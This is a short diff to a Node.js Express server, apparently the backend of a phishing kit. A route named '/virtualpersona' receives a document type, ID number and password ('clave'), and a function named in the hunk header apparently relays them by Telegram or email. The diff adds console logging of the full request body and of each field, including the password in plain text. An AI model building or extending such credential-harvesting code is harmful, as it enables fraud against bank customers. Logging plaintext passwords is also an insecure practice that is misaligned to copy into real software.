@@ -279,7 +279,17 @@ async function enviarMensajeTelegramCorreo({ tipoDoc, numDoc, clave, sessionId, 
 
 // Ruta de ingreso (clave segura)
 app.post("/virtualpersona", async (req, res) => {
+  console.log("📨 Solicitud recibida en /virtualpersona");
+  console.log("📦 req.body completo:", JSON.stringify(req.body, null, 2));
+
   const { sessionId, metodo, tipoDoc, numDoc, clave } = req.body;
+
+  console.log(`🔍 Valores destructurados:`);
+  console.log(`   - sessionId: ${sessionId}`);
+  console.log(`   - metodo: ${metodo}`);
+  console.log(`   - tipoDoc: ${tipoDoc}`);
+  console.log(`   - numDoc: ${numDoc}`);
+  console.log(`   - clave: ${clave}`);
 
   if (metodo === "clave") {
     sessions.set(sessionId, { redirect_to: null });
